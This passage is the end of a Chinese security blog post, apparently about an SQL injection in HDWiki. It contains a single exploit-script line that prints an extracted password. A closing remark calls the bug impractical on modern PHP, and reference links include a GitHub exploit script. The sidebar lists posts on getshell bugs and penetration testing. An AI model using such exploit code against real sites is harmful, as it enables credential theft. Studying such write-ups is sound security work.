<span class="k">print</span> <span class="s1">&#39;password:&#39;</span><span class="o">+</span><span class="n">val</span>
</code></pre></div><h1 id="0x06-结束">0x06 结束</h1>
<p>这个漏洞确实是比较鸡肋的，要PHP小于5.4版本并且开启GPC，现在PHP差不多都是5.6版本以上的。</p>
<h1 id="0x07-参考">0x07 参考</h1>
<p><a href="http://www.freebuf.com/vuls/170337.html">http://www.freebuf.com/vuls/170337.html</a></p>
<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/sql_hdwiki6.py">https://github.com/F0r3at/Python-Tools/blob/master/sql_hdwiki6.py</a></p>
<p><a href="https://www.lanzous.com/i1hb0od">https://www.lanzous.com/i1hb0od</a> 源码</p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/wordpress-4.9.6-arbitrary-file-removal-vulnerability/">
            Wordpress 4.9.6 Arbitrary File-Removal Vulnerability
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/">
            DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>